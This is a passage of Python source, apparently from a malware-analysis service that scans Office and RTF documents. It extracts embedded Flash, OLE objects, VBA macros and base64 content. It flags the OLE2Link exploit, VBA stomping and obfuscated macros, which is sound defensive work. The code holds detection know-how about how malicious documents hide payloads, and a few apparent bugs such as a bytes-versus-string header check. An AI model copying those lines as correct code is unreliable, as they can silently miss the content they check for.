            self.log.warning(f"Failed to parse PowerPoint Document stream for sample {self.sha}: {str(e)}")
            return False

    def _extract_swf_objects(self, sample_file: IO[bytes]) -> bool:
        """Search for embedded flash (SWF) content in sample.

        Args:
            f: Sample content.

        Returns:
            If Flash content is found
        """
        swf_found = False
        # Taken from oletools.thirdparty.xxpyswf disneyland module
        # def disneyland(f, filename, options):
        retfind_swf = xxxswf.findSWF(sample_file)
        sample_file.seek(0)
        # for each SWF in file
        for x in retfind_swf:
            sample_file.seek(x)
            sample_file.read(1)
            sample_file.seek(x)
            swf = self._verifySWF(sample_file, x)
            if swf is None:
                continue
            swf_md5 = hashlib.sha256(swf).hexdigest()
            self._extract_file(swf, f'{swf_md5}.swf', "Flash file extracted during sample analysis")
            swf_found = True
        return swf_found

    @staticmethod
    def _verifySWF(f: IO[bytes], x: int) -> Optional[bytes]:
        """Confirm that embedded flash content (SWF) has properties of the documented format.

        Args:
            f: Sample content.
            x: Start of possible embedded flash content.

        Returns:
            Flash content if confirmed, or None.
        """
        # Slightly modified code taken from oletools.thirdparty.xxpyswf verifySWF
        # Start of SWF
        f.seek(x)
        # Read Header
        header = f.read(3)
        # Read Version
        version = struct.unpack('<b', f.read(1))[0]
        # Read SWF Size
        size = struct.unpack('<i', f.read(4))[0]
        # Start of SWF
        f.seek(x)
        if version > 40 or not isinstance(size, int) or header not in ['CWS', 'FWS']:
            return None

        # noinspection PyBroadException
        try:
            if header == b'FWS':
                swf_data = f.read(size)
            elif header == b'CWS':
                f.read(3)
                swf_data = b'FWS' + f.read(5) + zlib.decompress(f.read())
            else:
                # TODO: zws -- requires lzma in python 2.7
                return None
            return swf_data
        except Exception:
            return None

    def _extract_vb_hex(self, encodedchunk: bytes) -> bool:
        """Attempts to convert possible hex encoding to ascii.

        Args:
            encodedchunk: Data that may contain hex encoding.

        Returns:
            True if hex content converted.
        """
        decoded = b''

        # noinspection PyBroadException
        try:
            while encodedchunk != b'':
                decoded += binascii.a2b_hex(encodedchunk[2:4])
                encodedchunk = encodedchunk[4:]
        except Exception:
            # If it fails, assuming not a real byte sequence
            return False
        hex_md5 = hashlib.sha256(decoded).hexdigest()
        self._extract_file(decoded, f'{hex_md5}.hex.decoded',
                           'Large hex encoded chunks detected during sample analysis')
        return True

# -- RTF objects --

    def _extract_rtf(self, file_contents: bytes) -> Optional[ResultSection]:
        """Handle RTF Packages.

        Args:
            file_contents: Contents of the submission

        Returns:
            A result section if any rtf results were found.
        """
        try:
            rtfp = RtfObjParser(file_contents)
            rtfp.parse()
        except Exception as e:
            self.log.debug(f'RtfObjParser failed to parse {self.sha}: {str(e)}')
            return None  # Can't continue
        rtf_template_res = self._process_rtf_alternate_metadata(file_contents)
        if not rtfp.objects and not rtf_template_res:
            return None

        streams_res = ResultSection("RTF objects")
        if rtf_template_res:
            _add_subsection(streams_res, rtf_template_res)

        sep = "-----------------------------------------"
        embedded = []
        linked = []
        unknown = []
        # RTF objdata
        for rtfobj in rtfp.objects:
            try:
                res_txt = ""
                res_alert = ""
                if rtfobj.is_ole:
                    res_txt += f'format_id: {rtfobj.format_id}\n'
                    res_txt += f'class name: {rtfobj.class_name}\n'
                    # if the object is linked and not embedded, data_size=None:
                    if rtfobj.oledata_size is None:
                        res_txt += 'data size: N/A\n'
                    else:
                        res_txt += f'data size: {rtfobj.oledata_size}\n'
                    if rtfobj.is_package:
                        res_txt = f'Filename: {rtfobj.filename}\n'
                        res_txt += f'Source path: {rtfobj.src_path}\n'
                        res_txt += f'Temp path = {rtfobj.temp_path}\n'

                        # check if the file extension is executable:
                        _, ext = os.path.splitext(rtfobj.filename)

                        if re.match(self.EXECUTABLE_EXTENSIONS_RE, ext):
                            res_alert += 'CODE/EXECUTABLE FILE'
                        else:
                            # check if the file content is executable:
                            m = magic.Magic()
                            ftype = m.from_buffer(rtfobj.olepkgdata)
                            if "executable" in ftype:
                                res_alert += 'CODE/EXECUTABLE FILE'
                    else:
                        res_txt += 'Not an OLE Package'
                    # Detect OLE2Link exploit
                    # http://www.kb.cert.org/vuls/id/921560
                    if rtfobj.class_name == 'OLE2Link':
                        res_alert += 'Possibly an exploit for the OLE2Link vulnerability (VU#921560, CVE-2017-0199)'
                else:
                    if rtfobj.start is not None:
                        res_txt = f'{hex(rtfobj.start)} is not a well-formed OLE object'
                    else:
                        res_txt = 'Malformed OLE Object'
                    if len(rtfobj.rawdata) >= self.LARGE_MALFORMED_BYTES:
                        res_alert += f"Data of malformed OLE object over {self.LARGE_MALFORMED_BYTES} bytes"
                        if streams_res.heuristic is None:
                            streams_res.set_heuristic(19)

                if rtfobj.format_id == oleobj.OleObject.TYPE_EMBEDDED:
                    embedded.append((res_txt, res_alert))
                elif rtfobj.format_id == oleobj.OleObject.TYPE_LINKED:
                    linked.append((res_txt, res_alert))
                else:
                    unknown.append((res_txt, res_alert))

                # Write object content to extracted file
                i = rtfp.objects.index(rtfobj)
                if rtfobj.is_package:
                    if rtfobj.filename:
                        fname = self._sanitize_filename(rtfobj.filename)
                    else:
                        fname = f'object_{rtfobj.start}.noname'
                    self._extract_file(rtfobj.olepkgdata, fname, f'OLE Package in object #{i}:')

                # When format_id=TYPE_LINKED, oledata_size=None
                elif rtfobj.is_ole and rtfobj.oledata_size is not None:
                    # set a file extension according to the class name:
                    class_name = rtfobj.class_name.lower()
                    if class_name.startswith(b'word'):
                        ext = 'doc'
                    elif class_name.startswith(b'package'):
                        ext = 'package'
                    else:
                        ext = 'bin'
                    fname = f'object_{hex(rtfobj.start)}.{ext}'
                    self._extract_file(rtfobj.oledata, fname, f'Embedded in OLE object #{i}:')

                else:
                    fname = f'object_{hex(rtfobj.start)}.raw'
                    self._extract_file(rtfobj.rawdata, fname, f'Raw data in object #{i}:')
            except Exception:
                self.log.warning(f"Failed to process an RTF object for sample {self.sha}: {traceback.format_exc()}")
        if embedded:
            emb_sec = ResultSection("RTF Embedded Object Details", body_format=BODY_FORMAT.MEMORY_DUMP,
                                    heuristic=Heuristic(21))
            for txt, alert in embedded:
                emb_sec.add_line(sep)
                emb_sec.add_line(txt)
                if alert != '':
                    emb_sec.set_heuristic(11)
                    for cve in re.findall(self.CVE_RE, alert):
                        emb_sec.add_tag('attribution.exploit', cve)
                    emb_sec.add_line(f"Malicious Properties found: {alert}")
            streams_res.add_subsection(emb_sec)
        if linked:
            lik_sec = ResultSection("Linked Object Details", body_format=BODY_FORMAT.MEMORY_DUMP,
                                    heuristic=Heuristic(13))
            for txt, alert in linked:
                lik_sec.add_line(txt)
                if alert != '':
                    for cve in re.findall(self.CVE_RE, alert):
                        lik_sec.add_tag('attribution.exploit', cve)
                    lik_sec.set_heuristic(12)
                    lik_sec.add_line(f"Malicious Properties found: {alert}")
            streams_res.add_subsection(lik_sec)
        if unknown:
            unk_sec = ResultSection("Unknown Object Details", body_format=BODY_FORMAT.MEMORY_DUMP)
            hits = 0
            for txt, alert in unknown:
                unk_sec.add_line(txt)
                if alert != '':
                    for cve in re.findall(self.CVE_RE, alert):
                        unk_sec.add_tag('attribution.exploit', cve)
                    hits += 1
                    unk_sec.add_line(f"Malicious Properties found: {alert}")
            unk_sec.set_heuristic(Heuristic(14, frequency=hits) if hits else None)
            streams_res.add_subsection(unk_sec)

        if streams_res.body or streams_res.subsections:
            return streams_res
        return None

    def _process_rtf_alternate_metadata(self, data: bytes) -> Optional[ResultSection]:
        """Extract RTF document metadata
        http://www.biblioscape.com/rtf15_spec.htm#Heading9

        Args:
            data: Contents of the submission

        Returns:
            A result section with RTF info if found.
        """

        start_bytes = b'{\\*\\template'
        end_bytes = b'}'

        start_idx = data.find(start_bytes)
        if start_idx < 0:
            return None
        end_idx = data.find(end_bytes, start_idx)

        tplt_data = data[start_idx + len(start_bytes):end_idx].decode('ascii', 'ignore').strip()

        re_rtf_escaped_str = re.compile(r'\\(?:(?P<uN>u-?[0-9]+[?]?)|(?P<other>.))')

        def unicode_rtf_replace(matchobj: re.Match) -> str:
            """Handle Unicode RTF Control Words, only \\uN and escaped characters

            """
            for match_name, match_str in matchobj.groupdict().items():
                if match_str is None:
                    continue
                if match_name == 'uN':
                    match_int = int(match_str.strip('u?'))
                    if match_int < -1:
                        match_int = 0x10000 + match_int
                    return chr(match_int)
                if match_name == 'other':
                    return match_str
            return matchobj.string
        link = re_rtf_escaped_str.sub(unicode_rtf_replace, tplt_data).encode('utf8', 'ignore').strip()
        safe_link = safe_str(link).encode('utf8', 'ignore')

        if safe_link:
            rtf_tmplt_res = ResultSection("RTF Template:", heuristic=Heuristic(1))
            rtf_tmplt_res.add_line(f'Path found: {safe_link}')
            self._process_link('attachedtemplate', safe_link, rtf_tmplt_res.heuristic, rtf_tmplt_res)
            return rtf_tmplt_res
        return None

    @staticmethod
    def _sanitize_filename(filename: str, replacement: str = '_', max_length: int = 200) -> str:
        """From rtfoby.py. Compute basename of filename. Replaces all non-whitelisted characters.

        Args:
            filename: Path to original sample.
            replacement: Character to replace non-whitelisted characters.
            max_length: Maximum length of the file name.

        Returns:
           Sanitized basename of the file.
        """
        basepath = os.path.basename(filename).strip()
        sane_fname = re.sub(r'[^\w.\- ]', replacement, basepath)

        while ".." in sane_fname:
            sane_fname = sane_fname.replace('..', '.')

        while "  " in sane_fname:
            sane_fname = sane_fname.replace('  ', ' ')

        if not len(filename):
            sane_fname = 'NONAME'

        # limit filename length
        if max_length:
            sane_fname = sane_fname[:max_length]

        return sane_fname

    # Macros
    def _check_for_macros(self, filename: str, request_hash: str) -> Optional[ResultSection]:
        """Use VBA_Parser in Oletools to extract VBA content from sample.

        Args:
            filename: Path to original sample.
            file_contents: Original sample file content.
            request_hash: Original submitted sample's sha256hash.

        Returns: A result section with the error condition if macros couldn't be analyzed
        """
        # noinspection PyBroadException
        try:
            vba_parser = VBA_Parser(filename)

            # Get P-code
            try:
                if vba_parser.detect_vba_stomping():
                    self.vba_stomping = True
                pcode: str = vba_parser.extract_pcode()
                # remove header
                pcode_l = pcode.split('\n', 2)
                if len(pcode_l) == 3:
                    self.pcode.append(pcode_l[2])
            except Exception as e:
                self.log.debug(f"pcodedmp.py failed to analyze pcode for sample {self.sha}. Reason: {str(e)}")

            # Get Macros
            try:
                if vba_parser.detect_vba_macros():
                    # noinspection PyBroadException
                    try:
                        for (subfilename, stream_path, vba_filename, vba_code) in vba_parser.extract_macros():
                            if stream_path == 'VBA P-code':
                                continue
                            assert isinstance(vba_code, str)
                            if vba_code.strip() == '':
                                continue
                            vba_code_sha256 = hashlib.sha256(str(vba_code).encode()).hexdigest()
                            if vba_code_sha256 == request_hash:
                                continue

                            self.macros.append(vba_code)
                    except Exception:
                        self.log.debug(f"OleVBA VBA_Parser.extract_macros failed for sample {self.sha}: "
                                       f"{traceback.format_exc()}")
                        section = ResultSection("OleVBA : Error extracting macros")
                        section.add_tag('technique.macro', "Contains VBA Macro(s)")
                        return section

            except Exception as e:
                self.log.debug(f"OleVBA VBA_Parser.detect_vba_macros failed for sample {self.sha}: {str(e)}")
                section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
                return section

        except Exception:
            self.log.debug(f"OleVBA VBA_Parser constructor failed for sample {self.sha}, "
                           f"may not be a supported OLE document")

    def _create_macro_sections(self, request_hash: str) -> Optional[ResultSection]:
        """ Creates result section for embedded macros of sample.

        Also extracts all macros and pcode content to individual files (all_vba_[hash].vba and all_pcode_[hash].data).

        Args:
            Request_hash: Original submitted sample's sha256hash.
        """
        macro_section = ResultSection("OleVBA : Macros detected")
        macro_section.add_tag('technique.macro', "Contains VBA Macro(s)")
        subsections = []
        # noinspection PyBroadException
        try:
            auto_exec: Set[str] = set()
            suspicious: Set[str] = set()
            network: Set[str] = set()
            network_section = ResultSection("Potential host or network IOCs", heuristic=Heuristic(27, frequency=0))
            for vba_code in self.macros:
                analyzed_code = self._deobfuscator(vba_code)
                subsection = self._macro_section_builder(vba_code, analyzed_code)
                if (self._macro_scanner(analyzed_code, auto_exec, suspicious, network, network_section)
                        or subsection.heuristic):
                    subsections.append(subsection)
            if auto_exec:
                autoexecution = ResultSection("Autoexecution strings",
                                              heuristic=Heuristic(32),
                                              parent=macro_section,
                                              body='\n'.join(auto_exec))
                for keyword in auto_exec:
                    assert autoexecution.heuristic
                    autoexecution.heuristic.add_signature_id(keyword)
            if suspicious:
                signatures = {keyword.lower().replace(' ', '_'): 1 for keyword in suspicious}
                heuristic = Heuristic(30, signatures=signatures) if signatures else None
                macro_section.add_subsection(ResultSection("Suspicious strings or functions",
                                                           heuristic=heuristic,
                                                           body='\n'.join(suspicious)))
            if network:
                assert network_section.heuristic
                if network_section.heuristic.frequency == 0:
                    network_section.set_heuristic(None)
                network_section.add_line('\n'.join(network))

            for subsection in subsections:  # Add dump sections after string sections
                macro_section.add_subsection(subsection)

            # Compare suspicious content macros to pcode, macros may have been stomped
            vba_sus, vba_matches = self._mraptor_check(self.macros, "all_vba", "vba_code", request_hash)
            pcode_sus, pcode_matches = self._mraptor_check(self.pcode, "all_pcode", "pcode", request_hash)

            if self.vba_stomping or pcode_matches and pcode_sus and not vba_sus:
                stomp_sec = ResultSection("VBA Stomping", heuristic=Heuristic(4))
                pcode_results = '\n'.join(m for m in pcode_matches if m not in set(vba_matches))
                if pcode_results:
                    stomp_sec.add_subsection(ResultSection("Suspicious content in pcode dump not found in macro dump:",
                                                           body=pcode_results))
                    stomp_sec.add_line("Suspicious VBA content different in pcode dump than in macro dump content.")
                    assert stomp_sec.heuristic
                    stomp_sec.heuristic.add_signature_id("Suspicious VBA stomped", score=500)
                    vba_stomp_sec = ResultSection("Suspicious content in macro dump:", parent=stomp_sec)
                    vba_stomp_sec.add_lines(vba_matches)
                    if not vba_matches:
                        vba_stomp_sec.add_line("None.")
                macro_section.add_subsection(stomp_sec)

        except Exception as e:
            self.log.debug(f"OleVBA VBA_Parser.detect_vba_macros failed for sample {self.sha}: "
                           f"{traceback.format_exc()}")
            section = ResultSection(f"OleVBA : Error parsing macros: {str(e)}")
            macro_section.add_subsection(section)
        return macro_section if macro_section.subsections else None

    # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages

    def _deobfuscator(self, text: str) -> str:
        """Attempts to identify and decode multiple types of deobfuscation in VBA code.

        Args:
            text: Original VBA code.

        Returns:
            Original text, or deobfuscated text if specified techniques are detected.
        """
        deobf = text
        # noinspection PyBroadException
        try:
            # leading & trailing quotes in each local function are to facilitate the final re.sub in deobfuscator()

            # repeated chr(x + y) calls seen in wild, as per SANS ISC diary from May 8, 2015
            def deobf_chrs_add(m):
                if m.group(0):
                    i = int(m.group(1)) + int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}\"'
                return ''

            deobf = re.sub(self.CHR_ADD_RE, deobf_chrs_add, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_add(m):
                result = ''
                if m.group(0):
                    result = m.group(0)

                    i = int(m.group(1)) + int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        result = f'"{chr(i)}"'
                return result

            deobf = re.sub(self.CHRW_ADD_RE, deobf_unichrs_add, deobf, flags=re.IGNORECASE)

            # suspect we may see chr(x - y) samples as well
            def deobf_chrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(self.CHR_SUB_RE, deobf_chrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(self.CHRW_SUB_RE, deobf_unichrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_chr(m):
                if m.group(1):
                    i = int(m.group(1))

                    if (i >= 0) and (i <= 255):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(self.CHR_RE, deobf_chr, deobf, flags=re.IGNORECASE)

            def deobf_unichr(m):
                if m.group(1):
                    i = int(m.group(1))

                    # chr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return f'"{chr(i)}"'
                return ''

            deobf = re.sub(self.CHRW_RE, deobf_unichr, deobf, flags=re.IGNORECASE)

            # handle simple string concatenations
            deobf = re.sub('" & "', '', deobf)

        except Exception:
            self.log.debug(f"Deobfuscator regex failure for sample {self.sha}, reverting to original text")
            deobf = text

        return deobf

    def _macro_section_builder(self, vba_code: str, analyzed_code: str) -> ResultSection:
        """Build an AL result section for Macro (VBA code) content.

        Args:
            macros: List of VBA codes for building result sections.

        Returns:
            Section with macro results.
        """
        vba_code_sha256 = hashlib.sha256(vba_code.encode()).hexdigest()
        macro_section = ResultSection(f"Macro SHA256 : {vba_code_sha256}")
        macro_section.add_tag('file.ole.macro.sha256', vba_code_sha256)
        if self._flag_macro(analyzed_code):
            macro_section.add_line("Macro may be packed or obfuscated.")
            macro_section.set_heuristic(20)

        dump_subsection = ResultSection("Macro contents dump", body_format=BODY_FORMAT.MEMORY_DUMP)
        if analyzed_code != vba_code:
            dump_subsection.title_text += " [deobfuscated]"
            dump_subsection.add_tag('technique.obfuscation', "VBA Macro String Functions")

        if len(analyzed_code) > self.MAX_STRINGDUMP_CHARS:
            dump_subsection.title_text += f" - Displaying only the first {self.MAX_STRINGDUMP_CHARS} characters."
            dump_subsection.add_line(analyzed_code[0:self.MAX_STRINGDUMP_CHARS])
        else:
            dump_subsection.add_line(analyzed_code)

        # Check for Excel 4.0 macro sheet
        if re.search(r'Sheet Information - Excel 4\.0 macro sheet', analyzed_code):
            dump_subsection.set_heuristic(51)

        return dump_subsection

    def _flag_macro(self, macro_text: str) -> bool:
        """Flag macros with obfuscated variable names

        We score macros based on the proportion of English trigraphs in the code,
        skipping over some common keywords.

        Args:
            macro_text: Macro string content.

        Returns:
            True if the score is lower than self.macro_score_min_alert
            (indicating macro is possibly malicious).
        """

        if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
            return False

        macro_text = macro_text.lower()
        score = 0.0

        word_count = 0
        byte_count = 0

        for macro_word in re.finditer(self.MACRO_WORDS_RE, macro_text):
            word = macro_word.group(0)
            word_count += 1
            byte_count += len(word)
            if word in self.macro_skip_words:
                continue
            prefix = word[0]
            tri_count = 0
            for i in range(1, len(word) - 1):
                trigraph = word[i:i + 2]
                if trigraph in self.word_chains.get(prefix, []):
                    tri_count += 1
                prefix = word[i]

            score += tri_count / (len(word) - 2)

        if byte_count < 128 or word_count < 32:
            # these numbers are arbitrary, but if the sample is too short the score is worthless
            return False

        # A lower score indicates more randomized text, random variable/function names are common in malicious macros
        return (score / word_count) < self.macro_score_min_alert

    def _macro_scanner(self, text: str, autoexecution: Set[str], suspicious: Set[str],
                       network: Set[str], network_section: ResultSection) -> bool:
        """ Scan the text of a macro with VBA_Scanner and collect results

        Args:
            text: Original VBA code.
            autoexecution: Set for adding autoexecution strings
            suspicious: Set for adding suspicious strings
            network: Set for adding host/network strings
            network_section: Section for tagging network results

        Returns:
            Whether interesting results were found.
        """
        try:
            vba_scanner = VBA_Scanner(text)
            vba_scanner.scan(include_decoded_strings=True)

            for string in self.ADDITIONAL_SUSPICIOUS_KEYWORDS:
                if re.search(string, text, re.IGNORECASE):
                    # play nice with detect_suspicious from olevba.py
                    suspicious.add(string.lower())

            if vba_scanner.autoexec_keywords is not None:
                for keyword, description in vba_scanner.autoexec_keywords:
                    autoexecution.add(keyword.lower())

            if vba_scanner.suspicious_keywords is not None:
                for keyword, description in vba_scanner.suspicious_keywords:
                    suspicious.add(keyword.lower())

            assert network_section.heuristic
            assert network_section.heuristic.frequency is not None
            freq = network_section.heuristic.frequency
            if vba_scanner.iocs is not None:
                for keyword, description in vba_scanner.iocs:
                    # olevba seems to have swapped the keyword for description during iocs extraction
                    # this holds true until at least version 0.27
                    if isinstance(description, str):
                        description = description.encode('utf-8', errors='ignore')

                    desc_ip = re.match(self.IP_RE, description)
                    uri, tag_type, tag = self.parse_uri(description)
                    if uri:
                        network.add(f"{keyword}: {safe_str(uri)}")
                        network_section.heuristic.increment_frequency()
                        network_section.add_tag('network.static.uri', uri)
                        if tag and tag_type:
                            network_section.add_tag(tag_type, tag)
                    elif desc_ip:
                        ip_str = safe_str(desc_ip.group(1))
                        if not is_ip_reserved(ip_str):
                            network_section.heuristic.increment_frequency()
                            network_section.add_tag('network.static.ip', ip_str)
                    else:
                        network.add(f"{keyword}: {safe_str(description)}")

            return bool(vba_scanner.autoexec_keywords
                        or vba_scanner.suspicious_keywords
                        or freq < network_section.heuristic.frequency)

        except Exception:
            self.log.warning(f"OleVBA VBA_Scanner constructor failed for sample {self.sha}: {traceback.format_exc()}")
            return False

    def _mraptor_check(self, macros: List[str], filename: str, description: str,
                       request_hash: str) -> Tuple[bool, List[str]]:
        """ Extract macros and analyze with MacroRaptor

        Args:
            macros: List of macros to check
            filename: Filename for extracted file
            description: Description for extracted file

        Returns:
            MacroRaptor scan of the macros
        """
        combined = '\n'.join(macros)
        if combined:
            data = combined.encode()
            combined_sha256 = hashlib.sha256(data).hexdigest()
            if combined_sha256 != request_hash:
                self._extract_file(data, f"{filename}_{combined_sha256[:15]}.data", description)

        assert self.request
        passwords = re.findall('PasswordDocument:="([^"]+)"', combined)
        if 'passwords' in self.request.temp_submission_data:
            self.request.temp_submission_data['passwords'].extend(passwords)
        else:
            self.request.temp_submission_data['passwords'] = passwords
        rawr_combined = mraptor.MacroRaptor(combined)
        rawr_combined.scan()
        return rawr_combined.suspicious, rawr_combined.matches

# -- XML --

    def _check_xml_strings(self, path: str, result: Result, include_fpos: bool = False) -> None:
        """Search xml content for external targets, indicators, and base64 content.

        Args:
            path: Path to original sample.
            result: Result sections are added to this result.
            include_fpos: Whether to include possible false positives in results.
        """
        xml_target_res = ResultSection("External Relationship Targets in XML", heuristic=Heuristic(1))
        assert xml_target_res.heuristic  # helps typecheckers
        xml_ioc_res = ResultSection("IOCs content:", heuristic=Heuristic(7, frequency=0))
        xml_b64_res = ResultSection("Base64 content:")
        xml_big_res = ResultSection("Files too large to be fully scanned", heuristic=Heuristic(3, frequency=0))

        external_links: List[Tuple[bytes, bytes]] = []
        ioc_files: Mapping[str, List[str]] = defaultdict(list)
        # noinspection PyBroadException
        try:
            xml_extracted = set()
            if not zipfile.is_zipfile(path):
                return  # Not an Open XML format file
            with zipfile.ZipFile(path) as z:
                for f in z.namelist():
                    try:
                        contents = z.open(f).read()
                    except zipfile.BadZipFile:
                        continue

                    try:
                        # Deobfuscate xml using parser
                        parsed = etree.XML(contents, None)
                        has_external = self._find_external_links(parsed)
                        data = etree.tostring(parsed)
                    except Exception:
                        # Use raw if parsing fails
                        data = contents
                        has_external = re.findall(self.EXTERNAL_LINK_RE, data)

                    if len(data) > self.MAX_XML_SCAN_CHARS:
                        data = data[:self.MAX_XML_SCAN_CHARS]
                        xml_big_res.add_line(f'{f}')
                        assert xml_big_res.heuristic
                        xml_big_res.heuristic.increment_frequency()

                    external_links.extend(has_external)
                    has_dde = re.search(rb'ddeLink', data)  # Extract all files with dde links
                    has_script = re.search(self.JAVASCRIPT_RE, data)  # Extract all files with javascript
                    extract_regex = bool(has_external or has_dde or has_script)

                    # Check for IOC and b64 data in XML
                    iocs, extract_ioc = self._check_for_patterns(data, include_fpos)
                    if iocs:
                        for tag_type, tags in iocs.items():
                            for tag in tags:
                                ioc_files[tag_type+safe_str(tag)].append(f)
                                xml_ioc_res.add_tag(tag_type, tag)

                    f_b64res = self._check_for_b64(data, f)
                    if f_b64res:
                        f_b64res.set_heuristic(8)
                        xml_b64_res.add_subsection(f_b64res)

                    # all vba extracted anyways
                    if (extract_ioc or f_b64res or extract_regex) and not f.endswith("vbaProject.bin"):
                        xml_sha256 = hashlib.sha256(contents).hexdigest()
                        if xml_sha256 not in xml_extracted:
                            self._extract_file(contents, xml_sha256, f"zipped file {f} contents")
                            xml_extracted.add(xml_sha256)
        except Exception:
            self.log.warning(f"Failed to analyze zipped file for sample {self.sha}: {traceback.format_exc()}")

        for ty, link in set(external_links):
            link_type = safe_str(ty)
            xml_target_res.add_line(f'{link_type} link: {safe_str(link)}')
            self._process_link(link_type, link, xml_target_res.heuristic, xml_target_res)

        if external_links:
            result.add_section(xml_target_res)
        if xml_big_res.body:
            result.add_section(xml_big_res)
        if xml_ioc_res.tags:
            for tag_type, res_tags in xml_ioc_res.tags.items():
                for res_tag in res_tags:
                    xml_ioc_res.add_line(f"Found the {tag_type.rsplit('.',1)[-1].upper()} string {res_tag} in:")
                    xml_ioc_res.add_lines(ioc_files[tag_type+res_tag])
                    xml_ioc_res.add_line('')
                    assert xml_ioc_res
                    xml_ioc_res.heuristic.increment_frequency()
            result.add_section(xml_ioc_res)
        if xml_b64_res.subsections:
            result.add_section(xml_b64_res)

    @staticmethod
    def _find_external_links(parsed: etree.ElementBase) -> List[Tuple[bytes, bytes]]:
        return [
            (relationship.attrib['Type'].rsplit('/', 1)[1].encode(), relationship.attrib['Target'].encode())
            for relationship in parsed.findall(OOXML_RELATIONSHIP_TAG)
            if 'Target' in relationship.attrib
            and 'Type' in relationship.attrib
            and 'TargetMode' in relationship.attrib
            and relationship.attrib['TargetMode'] == 'External'
        ]

# -- Helper methods --

    def _extract_file(self, data: bytes, file_name: str, description: str) -> None:
        """Adds data as an extracted file.

        Checks that there the service hasn't hit the extraction limit before extracting.

        Args:
            data: The data to extract.
            file_name: File name that will be written to.
            description: A description of the data.
        """
        assert self.request
        if self.excess_extracted:
            self.excess_extracted += 1
        else:
            try:
                # If for some reason the directory doesn't exist, create it
                if not os.path.exists(self.working_directory):
                    os.makedirs(self.working_directory)
                file_path = os.path.join(self.working_directory, file_name)
                with open(file_path, 'wb') as f:
                    f.write(data)
                self.request.add_extracted(file_path, file_name, description)
            except MaxExtractedExceeded:
                self.excess_extracted += 1
            except Exception:
                self.log.error(f"Error extracting {file_name} for sample {self.sha}: {traceback.format_exc(limit=2)}")

    def _check_for_patterns(self, data: bytes, include_fpos: bool = False) -> Tuple[Mapping[str, Set[bytes]], bool]:
        """Use FrankenStrings module to find strings of interest.

        Args:
            data: The data to be searched.
            include_fpos: Whether to include possible false positives.

        Returns:
            Dictionary of strings found by type and whether entity should be extracted (boolean).
        """
        extract = False
        found_tags = defaultdict(set)

        # Plain IOCs
        patterns_found = self.patterns.ioc_match(data, bogon_ip=True)
        for tag_type, iocs in patterns_found.items():
            for ioc in iocs:
                if any(string in ioc for string in self.pat_safelist) \
                        or ioc.endswith(self.PAT_ENDS) \
                        or ioc.lower() in self.tag_safelist:
                    continue
                # Skip .bin files that are common in normal excel files
                if not include_fpos and \
                        tag_type == 'file.name.extracted' and re.match(self.EXCEL_BIN_RE, ioc):
                    continue
                extract = extract or self._decide_extract(tag_type, ioc, include_fpos)
                found_tags[tag_type].add(ioc)

        return dict(found_tags), extract

    def _decide_extract(self, ty: str, val: bytes, basic_only: bool = False) -> bool:
        """Determine if entity should be extracted by filtering for highly suspicious strings.

        Args:
            ty: IOC type.
            val: IOC value (as bytes).
            basic_only: If set to true only basic checks are done

        Returns:
            Whether the string is suspicious enough to trigger extraction.
        """
        if ty == 'file.name.extracted':
            if val.startswith(b'oleObject'):
                return False
            _, ext = os.path.splitext(val)
            if ext and not ext.upper() in self.FILES_OF_INTEREST:
                return False
        elif ty == 'file.string.blacklisted':
            if val == b'http':
                return False

        # When deepscanning, do only minimal whitelisting
        if basic_only:
            return True

        # common false positives
        if ty == 'network.email.address':
            return False
        if ty == 'file.string.api' and val.lower() == b'connect':
            return False
        if ty == 'file.string.blacklisted' and val.lower() in self.BLACKLIST_IGNORE:
            return False
        return True

    # noinspection PyBroadException

    def _check_for_b64(self, data: bytes, dataname: str) -> Optional[ResultSection]:
        """Search and decode base64 strings in sample data.

        Args:
            data: The data to be searched.
            dataname: The name (file / section) the data is from

        Returns:
            ResultSection with base64 results if results were found.
        """
        b64_res = ResultSection(f"Base64 in {dataname}:")
        b64_ascii_content = []

        seen_base64 = set()
        for base64data, start, end in find_base64(data):
            if base64data in seen_base64 or not self.MAX_BASE64_CHARS > len(base64data) > 30:
                continue
            seen_base64.add(base64data)

            sha256hash = hashlib.sha256(base64data).hexdigest()
            dump_section: Optional[ResultSection] = None
            if len(base64data) > self.MAX_STRINGDUMP_CHARS:
                # Check for embedded files of interest
                m = magic.Magic(mime=True)
                ftype = m.from_buffer(base64data)
                if 'octet-stream' not in ftype:
                    continue
                self._extract_file(base64data,
                                   f"{sha256hash[0:10]}_b64_decoded",
                                   "Extracted b64 file during OLETools analysis")
            else:
                # Display ascii content
                check_utf16 = base64data.decode('utf-16', 'ignore').encode('ascii', 'ignore')
                if check_utf16 != b'':
                    asc_b64 = check_utf16
                # Filter printable characters then put in results
                asc_b64 = bytes(i for i in base64data if 31 < i < 127)
                # If data has less then 7 uniq chars then ignore
                if len(set(asc_b64)) <= 6 or len(re.sub(rb'\s', b'', asc_b64)) <= 14:
                    continue
                dump_section = ResultSection("DECODED ASCII DUMP:",
                                             body=safe_str(asc_b64),
                                             body_format=BODY_FORMAT.MEMORY_DUMP)
                b64_ascii_content.append(asc_b64)

            sub_b64_res = ResultSection(f"Result {sha256hash}", parent=b64_res)
            sub_b64_res.add_line(f'BASE64 TEXT SIZE: {end-start}')
            sub_b64_res.add_line(f'BASE64 SAMPLE TEXT: {data[start:min(start+50, end)]}[........]')
            sub_b64_res.add_line(f'DECODED SHA256: {sha256hash}')
            if dump_section:
